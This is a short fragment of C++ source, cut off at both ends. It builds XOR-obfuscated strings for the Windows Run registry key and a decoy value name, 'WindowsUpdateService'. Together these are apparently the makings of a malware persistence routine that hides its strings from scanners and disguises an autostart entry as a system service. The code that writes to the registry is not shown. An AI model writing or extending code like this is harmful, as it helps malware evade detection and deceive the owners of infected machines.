...
void z0(const string &x1)
{
    ...
    const char k1[] = {
        'S' ^ 0x55, 'o' ^ 0x55, 'f' ^ 0x55, 't' ^ 0x55, 'w' ^ 0x55, 'a' ^ 0x55, 'r' ^ 0x55, 'e' ^ 0x55, '\\' ^ 0x55,
        'M' ^ 0x55, 'i' ^ 0x55, 'c' ^ 0x55, 'r' ^ 0x55, 'o' ^ 0x55, 's' ^ 0x55, 'o' ^ 0x55, 'f' ^ 0x55, 't' ^ 0x55, '\\' ^ 0x55,
        'W' ^ 0x55, 'i' ^ 0x55, 'n' ^ 0x55, 'd' ^ 0x55, 'o' ^ 0x55, 'w' ^ 0x55, 's' ^ 0x55, '\\' ^ 0x55,
        'C' ^ 0x55, 'u' ^ 0x55, 'r' ^ 0x55, 'r' ^ 0x55, 'e' ^ 0x55, 'n' ^ 0x55, 't' ^ 0x55,
        'V' ^ 0x55, 'e' ^ 0x55, 'r' ^ 0x55, 's' ^ 0x55, 'i' ^ 0x55, 'o' ^ 0x55, 'n' ^ 0x55, '\\' ^ 0x55,
        'R' ^ 0x55, 'u' ^ 0x55, 'n' ^ 0x55,
        0
    };

    // Obfuscated: "WindowsUpdateService"
    const char v1[] = {
        'W' ^ 0x55, 'i' ^ 0x55, 'n' ^ 0x55, 'd' ^ 0x55, 'o' ^ 0x55, 'w' ^ 0x55, 's' ^ 0x55,
        'U' ^ 0x55, 'p' ^ 0x55, 'd' ^ 0x55, 'a' ^ 0x55, 't' ^ 0x55, 'e' ^ 0x55,
        'S' ^ 0x55, 'e' ^ 0x55, 'r' ^ 0x55, 'v' ^ 0x55, 'i' ^ 0x55, 'c' ^ 0x55, 'e' ^ 0x55,
        0
    };
